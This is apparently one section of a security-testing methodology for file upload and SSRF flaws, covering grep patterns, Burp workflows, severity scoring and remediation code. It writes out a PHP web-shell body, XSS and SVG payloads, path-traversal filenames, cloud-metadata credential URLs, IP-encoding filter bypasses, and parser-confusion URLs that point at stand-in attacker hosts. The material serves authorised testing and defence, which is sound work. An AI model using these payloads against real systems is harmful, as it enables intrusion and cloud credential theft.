# Pass 10: File Upload & SSRF

**OWASP Mapping:** A05:2025 (SSRF), WSTG-BUSL-08/09 (File Upload), WSTG-INPV-19 (SSRF)
**Weight:** 5% of Security Score
**Automation Level:** 60% fully automated, 30% AI-assisted, 10% manual judgment

---

## Purpose

Detect file upload vulnerabilities that could lead to remote code execution, data exfiltration, or denial of service, and server-side request forgery (SSRF) vulnerabilities that allow attackers to make the server perform unintended requests to internal services, cloud metadata endpoints, or external systems. File upload and SSRF are frequently chained together (e.g., uploading a file that triggers an SSRF via URL-based file processing).

---

## Tier 0: Static Analysis (Code-Level)

### 0.1 File Upload Validation

```
Grep patterns:

# File upload handling
pattern: "multer|formidable|busboy|express-fileupload|multipart"
context: identify file upload middleware and configuration
pattern: "FileInterceptor|UploadedFile|@UseInterceptors.*File"
context: NestJS file upload handling
pattern: "request\.files|req\.files|req\.file"
context: accessing uploaded files in request handlers

# Extension validation
pattern: "(allowedExtensions|validExtensions|acceptedTypes|fileFilter)\s*[:=]"
expected: PRESENT — explicit allowlist of permitted file extensions
flag_if_missing: HIGH — no file extension validation detected

# Content-type validation
pattern: "(mimetype|mimeType|content-type|contentType).*check|validate|allow"
expected: PRESENT — MIME type validation
context: verify server validates MIME type (not just trusts client header)

# File size limits
pattern: "(maxSize|fileSize|sizeLimit|maxFileSize|limits.*size)\s*[:=]"
expected: PRESENT — file size limit configured
flag_if_missing: MEDIUM — no file size limit detected

# Filename sanitization
pattern: "(filename|originalname|file\.name).*sanitize|clean|replace|normalize"
expected: PRESENT — filename sanitization before storage
flag_if_missing: HIGH — filenames stored without sanitization

# File storage path
pattern: "(destination|uploadDir|upload_path|savePath)\s*[:=]"
context: verify upload directory is outside web root
severity: HIGH if uploads are stored in publicly accessible directory
```

### 0.2 URL Parameters for Server-Side Requests

```
# HTTP client libraries (potential SSRF sinks)
pattern: "axios\.(get|post|put|delete|request)|axios\("
context: check if URL parameter comes from user input
pattern: "fetch\(|node-fetch|got\(|got\.get|request\(|superagent"
context: check if URL is user-controlled
pattern: "urllib\.request|requests\.(get|post|put|delete)|httpx\."
context: Python HTTP clients with user-controlled URLs

# URL parameters in request handlers
pattern: "(url|uri|href|link|src|source|target|redirect|callback|webhook)\s*[:=]\s*req\.(body|query|params)"
severity: HIGH — user-controlled URL used in server-side request

# Image/file processing from URLs
pattern: "sharp\(.*url|imagemagick.*url|puppeteer.*goto|pdf.*url|wkhtmlto"
severity: HIGH — URL-based file processing (SSRF + file upload chain)
pattern: "cheerio\.load\(.*fetch|jsdom.*fetch|puppeteer|playwright"
context: server-side rendering with user-controlled URLs

# DNS resolution
pattern: "dns\.resolve|dns\.lookup|net\.connect|net\.createConnection"
context: direct DNS/network operations with user input
```

### 0.3 SSRF Protection Patterns

```
# URL validation
pattern: "url\.parse|new\s+URL\(|URL\.canParse"
context: verify URL is validated before use in server-side request

# IP allowlist/denylist
pattern: "(allowlist|whitelist|denylist|blacklist|blocked).*ip|ip.*(allow|deny|block)"
expected: PRESENT — internal IP range blocking for SSRF prevention
pattern: "127\.0\.0\.1|localhost|0\.0\.0\.0|169\.254\.\d+\.\d+"
context: check if these are blocked in URL validation

# Private IP range checks
pattern: "isPrivateIP|isInternalIP|isReservedIP|private.*range|internal.*network"
expected: PRESENT for URL validation in request-making endpoints

# SSRF protection libraries
pattern: "ssrf-req-filter|ssrf-guard|ssrf-agent|safe-url"
expected: PRESENT if application makes server-side requests with user URLs
```

---

## Tier 1: Automated Scanning (10 Checks)

### Check 1: File Type Validation (Upload Executable Extensions)

**Tools:** Burp Repeater
**WSTG:** WSTG-BUSL-09

```
Workflow:
1. Identify file upload endpoints in the application
2. Upload files with dangerous extensions via Burp Repeater:

   Web shells:
   - test.php, test.php5, test.phtml, test.phar
   - test.jsp, test.jspx, test.jsw, test.jsv
   - test.asp, test.aspx, test.ashx, test.asmx
   - test.py, test.rb, test.pl, test.cgi

   Script files:
   - test.html, test.htm, test.svg
   - test.js, test.json
   - test.xml, test.xsl

   Configuration:
   - test.htaccess, test.config, test.ini
   - web.config, .env

3. For each upload attempt, analyze response:
   Upload rejected = PASS (extension validation working)
   Upload accepted = VERIFY (check if file is accessible/executable)

4. If accepted, attempt to access uploaded file:
   - Navigate to the uploaded file URL
   - Check if server executes the file (PHP, JSP) or serves it as static
   - Check Content-Type of served file
   - Check Content-Disposition header (should be 'attachment' for non-image)

5. Test double extension bypass:
   - test.php.jpg, test.asp;.jpg
   - test.php%00.jpg (null byte)
   - test.php.png (double extension)
```

### Check 2: Content-Type Bypass (MIME Type Manipulation)

**Tools:** Burp Repeater
**WSTG:** WSTG-BUSL-09

```
Workflow:
1. Upload a legitimate image file and capture the request
2. Modify the Content-Type header while keeping malicious content:

   Test 1: Send PHP content with image/jpeg Content-Type
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Type: image/jpeg
   Body: <?php system($_GET['cmd']); ?>

   Test 2: Send HTML content with image/png Content-Type
   Content-Disposition: form-data; name="file"; filename="xss.html"
   Content-Type: image/png
   Body: <script>alert(document.cookie)</script>

   Test 3: Send SVG with XML Content-Type
   Content-Disposition: form-data; name="file"; filename="test.svg"
   Content-Type: image/svg+xml
   Body: <svg><script>alert(1)</script></svg>

3. Check server behavior:
   - Does server validate Content-Type from client? (insufficient)
   - Does server validate actual file content (magic bytes)? (good)
   - Does server re-determine MIME type from file content? (best)

4. Verify uploaded files are served with correct Content-Type:
   - Malicious PHP served as text/plain = safe
   - Malicious PHP served as application/x-httpd-php = CRITICAL
   - SVG with script served as image/svg+xml = HIGH (XSS via SVG)
```

### Check 3: File Name Traversal (Path Traversal in Filenames)

**Tools:** Burp Repeater
**WSTG:** WSTG-BUSL-09

```
Workflow:
1. Upload file with path traversal in filename:

   Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
   Content-Disposition: form-data; name="file"; filename="..\..\..\..\windows\system32\config\sam"
   Content-Disposition: form-data; name="file"; filename="....//....//....//etc/passwd"
   Content-Disposition: form-data; name="file"; filename="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
   Content-Disposition: form-data; name="file"; filename="..%252f..%252f..%252fetc%252fpasswd"

2. Check if file is stored outside intended directory:
   - Can the file overwrite server configuration?
   - Can the file be placed in a web-accessible directory?
   - Can the file be placed in a code execution directory?

3. Test filename length limits:
   - Send extremely long filename (1000+ chars)
   - Check for buffer overflow or truncation vulnerabilities

4. Test special characters in filename:
   - Null bytes: test%00.jpg
   - Semicolons: test.php;.jpg
   - Unicode: test\u202e.jpg (right-to-left override)
   - Spaces: test .php
```

### Check 4: Polyglot Files (JPEG with Embedded Script)

**Tools:** Burp Repeater
**WSTG:** WSTG-BUSL-09

```
Workflow:
1. Create polyglot test files:

   JPEG+PHP polyglot:
   - Valid JPEG header (FF D8 FF E0) followed by PHP code
   - If server checks magic bytes AND executes PHP: CRITICAL

   PNG+HTML polyglot:
   - Valid PNG header followed by HTML/JavaScript
   - May execute if served with text/html Content-Type

   GIF+JavaScript polyglot:
   - GIF89a followed by JavaScript (GIF89a is valid JS)
   - May execute in certain contexts

   SVG with embedded script:
   - Valid SVG with <script> element
   - Always executes if served as SVG

2. Upload each polyglot file
3. Access the uploaded file and check:
   - Does server validate file content beyond magic bytes?
   - Is the file re-encoded/re-processed (stripping embedded code)?
   - Is the file served from a separate domain (isolation)?
   - Is Content-Type correctly set based on actual content?

4. Check if image processing libraries strip embedded code:
   - Sharp, ImageMagick, Pillow — should re-encode images
   - Verify re-encoding removes embedded scripts/code
```

### Check 5: File Size Limits

**Tools:** Burp Repeater
**WSTG:** WSTG-BUSL-08

```
Workflow:
1. Test file size limits:
   - Upload file at expected limit (e.g., 5MB) — should succeed
   - Upload file above limit (e.g., 50MB) — should be rejected
   - Upload file significantly above limit (e.g., 500MB) — should be rejected early

2. Check for server-side limit enforcement:
   - Client-side only limit (JavaScript) = INSUFFICIENT (bypassable)
   - Server-side limit with early rejection = PASS
   - No limit at all = MEDIUM (resource exhaustion risk)

3. Test chunked upload bypass:
   - If chunked transfer encoding is used, do size limits apply per-chunk or total?
   - Can you bypass limits by sending many small chunks?

4. Test multiple simultaneous large uploads:
   - Upload many files concurrently
   - Check for resource exhaustion (disk space, memory)
   - Verify per-user upload quotas exist

5. Check for zip bomb/decompression bomb:
   - Upload compressed file that expands to huge size
   - Verify server has decompression size limits
```

### Check 6: SSRF via URL Parameters (Localhost, Internal IPs, Metadata)

**Tools:** Burp Intruder
**WSTG:** WSTG-INPV-19

```
Workflow:
1. Identify parameters that accept URLs:
   - Profile picture URL, avatar URL
   - Webhook callback URL
   - Import from URL features
   - Preview/fetch URL features
   - PDF generation from URL
   - RSS feed URL

2. Test SSRF payloads via Burp Intruder:

   Internal services:
   - http://localhost/
   - http://127.0.0.1/
   - http://[::1]/
   - http://0.0.0.0/
   - http://localhost:3000/ (common dev ports)
   - http://localhost:8080/
   - http://localhost:5432/ (PostgreSQL)
   - http://localhost:6379/ (Redis)
   - http://localhost:27017/ (MongoDB)

   Cloud metadata:
   - http://169.254.169.254/latest/meta-data/ (AWS IMDS v1)
   - http://169.254.169.254/latest/api/token (AWS IMDS v2)
   - http://metadata.google.internal/computeMetadata/v1/ (GCP)
   - http://169.254.169.254/metadata/instance (Azure)
   - http://100.100.100.200/latest/meta-data/ (Alibaba)

   Internal network:
   - http://10.0.0.1/
   - http://172.16.0.1/
   - http://192.168.1.1/
   - http://internal-service.local/

3. Analyze responses:
   - Response contains internal service data = CRITICAL
   - Response contains cloud metadata/credentials = CRITICAL
   - Connection timeout (different from invalid URL error) = potential blind SSRF
   - Response reflects content from internal URL = HIGH
```

### Check 7: SSRF via File Imports (PDF Generation, Image Fetch)

**Tools:** Burp Repeater
**WSTG:** WSTG-INPV-19

```
Workflow:
1. Identify file import/processing features:
   - PDF generation from HTML/URL (wkhtmltopdf, Puppeteer, Prince)
   - Image fetch and resize from URL
   - Document import (Google Docs URL, Notion URL)
   - RSS/feed parsing
   - URL preview/unfurl (link cards in chat)
   - CSV/Excel import with URL columns

2. Test SSRF via file processing:

   PDF generation:
   - Submit HTML with: <iframe src="http://169.254.169.254/latest/meta-data/">
   - Submit HTML with: <img src="http://localhost:3000/api/admin/users">
   - Submit HTML with: <link rel="stylesheet" href="http://internal-service/data">
   - Check if generated PDF contains internal data

   Image URL:
   - Set image URL to: http://169.254.169.254/latest/meta-data/
   - Set image URL to: http://localhost:6379/ (Redis commands via HTTP)
   - Check server response for internal data

   Document import:
   - Import URL pointing to internal services
   - Check if content from internal URL is processed

3. Test SVG-based SSRF:
   - Upload SVG with: <image href="http://169.254.169.254/latest/meta-data/">
   - Upload SVG with: <foreignObject><body><iframe src="http://internal/"></iframe></body></foreignObject>
   - Check if server-side SVG rendering fetches the URL
```

### Check 8: Blind SSRF (Out-of-Band Detection)

**Tools:** Burp Collaborator
**WSTG:** WSTG-INPV-19

```
Workflow:
1. Generate Burp Collaborator payloads (unique subdomains)

2. Inject Collaborator URL into all SSRF-candidate parameters:
   - URL parameters: ?url=http://[collaborator-id].burpcollaborator.net
   - Webhook fields: callback=http://[collaborator-id].burpcollaborator.net
   - Import URLs: import_url=http://[collaborator-id].burpcollaborator.net
   - Image URLs: avatar=http://[collaborator-id].burpcollaborator.net

3. Monitor Collaborator for callbacks:
   - DNS lookup from server = confirms blind SSRF (server resolved the domain)
   - HTTP request from server = confirms SSRF with HTTP interaction
   - No callback = likely not vulnerable (or blocked at network level)

4. Analyze callback details:
   - Source IP of the callback (internal IP reveals server network)
   - User-Agent of the callback (reveals server-side library)
   - Request path/headers (reveals processing context)

5. Attempt to escalate blind SSRF:
   - If DNS interaction confirmed, try HTTP interaction
   - If HTTP interaction confirmed, try accessing internal services
   - Use DNS rebinding to bypass IP-based filters
```

### Check 9: SSRF Filter Bypass (Hex/Octal IP, DNS Rebinding)

**Tools:** Burp Intruder
**WSTG:** WSTG-INPV-19

```
Workflow:
1. If basic SSRF is blocked, test bypass techniques:

   Alternative IP representations for 127.0.0.1:
   - Decimal: http://2130706433/
   - Hex: http://0x7f000001/
   - Octal: http://0177.0.0.1/
   - Hex with dots: http://0x7f.0x0.0x0.0x1/
   - Mixed: http://127.1/ (short form)
   - IPv6 mapped: http://[::ffff:127.0.0.1]/
   - Enclosed brackets: http://[127.0.0.1]/

   Alternative representations for 169.254.169.254:
   - Decimal: http://2852039166/
   - Hex: http://0xa9fea9fe/
   - Octal: http://0251.0376.0251.0376/

2. URL encoding bypass:
   - Single encode: http://%31%32%37%2e%30%2e%30%2e%31/
   - Double encode: http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/
   - Unicode: http://①②⑦.⓪.⓪.①/

3. DNS rebinding attack:
   - Use a domain that resolves to internal IP:
     dns-rebinding.attacker.com -> 127.0.0.1
   - First DNS lookup returns external IP (passes filter)
   - Second DNS lookup returns internal IP (SSRF achieved)

4. Open redirect chaining:
   - If application has an open redirect vulnerability:
     http://target.com/redirect?url=http://169.254.169.254/
   - Server follows redirect to internal URL

5. URL parser inconsistencies:
   - http://evil.com#@127.0.0.1/ (fragment vs authority confusion)
   - http://127.0.0.1:80@evil.com/ (credential parsing)
   - http://127.0.0.1\@evil.com/ (backslash parsing)
```

### Check 10: Cloud Metadata Access (169.254.169.254)

**Tools:** Burp Repeater
**WSTG:** WSTG-INPV-19

```
Workflow:
1. Test direct metadata access via SSRF parameters:

   AWS Instance Metadata Service (IMDS):
   http://169.254.169.254/latest/meta-data/
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   http://169.254.169.254/latest/user-data
   
   AWS IMDS v2 (token-based):
   PUT http://169.254.169.254/latest/api/token
   Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
   (If IMDS v2 is enforced, direct SSRF may fail — still test v1 fallback)

   GCP Metadata:
   http://metadata.google.internal/computeMetadata/v1/
   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
   Header: Metadata-Flavor: Google

   Azure Metadata:
   http://169.254.169.254/metadata/instance?api-version=2021-02-01
   Header: Metadata: true

   DigitalOcean:
   http://169.254.169.254/metadata/v1/

2. Analyze response for credential exposure:
   CRITICAL: IAM credentials (access key, secret key, session token)
   CRITICAL: Service account tokens
   HIGH: Instance metadata (hostname, network config, user data)
   HIGH: User data containing startup scripts with secrets

3. Test metadata access via DNS rebinding:
   - Domain that resolves to 169.254.169.254
   - Bypasses IP-based denylist filters

4. Verify IMDS v2 enforcement (AWS):
   - Check if server requires token for metadata access
   - IMDS v2 mitigates many SSRF-to-metadata attacks
   - But does not prevent all SSRF scenarios
```

---

## Tier 2: AI Judgment (7 Contextual Questions)

### Q1: File Upload Architecture Security
Is the file upload architecture designed with security in mind? Are files stored outside the web root? Are uploaded files served from a separate domain/CDN? Is there a content pipeline that re-encodes/sanitizes uploads? Are filenames server-generated (not user-controlled)?

### Q2: File Processing Pipeline Safety
If files are processed server-side (image resize, PDF generation, document parsing), are the processing libraries up to date and hardened? Are there known vulnerabilities in the file processing stack (ImageMagick, LibreOffice, Ghostscript)? Is processing done in a sandboxed environment?

### Q3: SSRF Defense Depth
Does the application have multiple layers of SSRF protection? URL validation + IP denylist + network segmentation? What happens if the URL validation is bypassed — does network-level protection (firewall rules, IMDS v2) provide a fallback?

### Q4: Cloud Metadata Protection
If deployed on cloud infrastructure (AWS, GCP, Azure), is the instance metadata service hardened? Is IMDS v2 enforced (AWS)? Are instance roles scoped to minimum necessary permissions? Would SSRF to the metadata endpoint yield high-value credentials?

### Q5: Upload Content Verification
Does the server verify file content beyond extension and Content-Type header? Is there magic byte validation? Is there deep content inspection (antivirus, content analysis)? Could a polyglot file bypass all validation layers?

### Q6: Network Segmentation Impact
What is the blast radius of a successful SSRF? Can the server reach internal databases, admin panels, or other sensitive services directly? Is there network segmentation between the web tier and backend services?

### Q7: File Upload Rate and Volume Controls
Are there controls on upload frequency and total storage per user? Could an attacker exhaust disk space via unrestricted uploads? Are there quotas and cleanup mechanisms?

---

## Severity Classification

### Critical (P1 — Score: 0/10)
- Web shell upload and execution confirmed (RCE)
- SSRF to cloud metadata returning IAM credentials or service account tokens
- SSRF to internal database returning data (Redis, MongoDB, PostgreSQL)
- File upload path traversal overwriting server configuration files
- SSRF allowing access to internal admin panels or management interfaces

### High (P2 — Score: 2/10)
- File upload accepts executable extensions but cannot confirm execution
- Blind SSRF confirmed via out-of-band callback (DNS/HTTP interaction)
- SSRF to internal services with network access (no data in response)
- SVG upload with embedded JavaScript executed in user context (Stored XSS)
- No Content-Type validation on uploads (accepts any file type)
- SSRF filter bypassable via IP encoding techniques

### Medium (P3 — Score: 5/10)
- File upload with no server-side size limits (DoS risk)
- SSRF URL parameters present but blocked by IP denylist (defense in place)
- Content-Type manipulation accepted but file not executable
- Uploaded files served from same domain (no origin isolation)
- File names not sanitized but path traversal blocked at filesystem level
- Polyglot file accepted but re-encoded by processing pipeline

### Low (P4 — Score: 7/10)
- File upload stores user-provided filename but sanitizes path components
- SSRF parameters present but only accept HTTPS URLs (limited attack surface)
- File upload missing virus/malware scanning
- No file upload quotas per user (storage abuse risk)
- Missing Content-Disposition: attachment on file downloads (inline rendering)

---

## False Positive Indicators

### File Upload False Positives
- **Image re-encoding:** If the server re-encodes uploaded images (Sharp, ImageMagick, Pillow), embedded scripts are stripped. Verify the served file does not contain the payload
- **Separate domain serving:** Files served from a separate domain (cdn.example.com) with proper CSP cannot execute scripts in the main application context
- **Content-Disposition: attachment:** Files served with this header are downloaded, not rendered. XSS via upload requires inline rendering
- **Server-generated filenames:** If the server ignores the client-provided filename and generates its own (UUID.ext), path traversal in filenames is not exploitable

### SSRF False Positives
- **Client-side URL fetching:** If URL fetching happens in the browser (not server), it is not SSRF. Verify the request originates from the server IP, not the client IP
- **Allowlisted URLs only:** If the application only fetches from a strict allowlist of domains, arbitrary SSRF is not possible. Verify the allowlist cannot be bypassed
- **Webhook signature verification:** Webhook endpoints that verify signatures (HMAC) prevent arbitrary request forgery even if URL is attacker-controlled
- **Network firewall blocking:** If network-level firewall blocks requests to internal IPs and metadata endpoints, SSRF impact is limited (still report the vulnerability but note mitigation)

---

## Remediation

### File Upload Security
1. **Extension allowlist** — only permit specific known-safe extensions:
   ```javascript
   const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf'];
   const ext = path.extname(file.originalname).toLowerCase();
   if (!ALLOWED_EXTENSIONS.includes(ext)) reject(file);
   ```

2. **Content validation** — verify file content matches claimed type:
   ```javascript
   const fileType = await FileType.fromBuffer(buffer);
   if (!fileType || !ALLOWED_MIMES.includes(fileType.mime)) reject(file);
   ```

3. **Server-generated filenames** — never use client-provided names:
   ```javascript
   const filename = `${crypto.randomUUID()}${allowedExtension}`;
   ```

4. **Separate storage domain** — serve uploads from a different origin:
   - uploads.example.com instead of example.com/uploads
   - Prevents XSS via uploaded files from affecting main application

5. **File size limits** — enforce server-side:
   ```javascript
   const upload = multer({ limits: { fileSize: 5 * 1024 * 1024 } }); // 5MB
   ```

6. **Re-encode uploaded images** — strips embedded code:
   ```javascript
   await sharp(buffer).jpeg({ quality: 80 }).toFile(outputPath);
   ```

7. **Content-Disposition header** — force download on non-image files:
   ```
   Content-Disposition: attachment; filename="document.pdf"
   ```

### SSRF Prevention
1. **URL allowlist** — only permit specific domains/protocols:
   ```javascript
   const ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com'];
   const url = new URL(userInput);
   if (!ALLOWED_HOSTS.includes(url.hostname)) throw new Error('Blocked');
   ```

2. **IP denylist** — block private/reserved IP ranges:
   ```javascript
   function isPrivateIP(ip) {
     return ip.match(/^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.|0\.)/);
   }
   // Resolve DNS BEFORE making request, then check resolved IP
   ```

3. **DNS resolution validation** — resolve hostname and check IP before request:
   ```javascript
   const { address } = await dns.promises.lookup(url.hostname);
   if (isPrivateIP(address)) throw new Error('SSRF blocked');
   ```

4. **Network segmentation** — restrict outbound connections from web servers:
   - Firewall rules blocking access to internal services
   - Separate VPC/subnet for web tier vs data tier

5. **Cloud metadata hardening:**
   - AWS: Enforce IMDS v2 (require token for metadata access)
   - Limit IAM role permissions to minimum necessary
   - Use VPC endpoints instead of public internet for AWS services

6. **SSRF protection library** — use dedicated middleware:
   ```javascript
   const ssrfFilter = require('ssrf-req-filter');
   const agent = ssrfFilter(url); // throws on internal URLs
   await fetch(url, { agent });
   ```

7. **Disable unnecessary URL schemes:**
   - Only allow http:// and https://
   - Block file://, ftp://, gopher://, dict://, data://, etc.
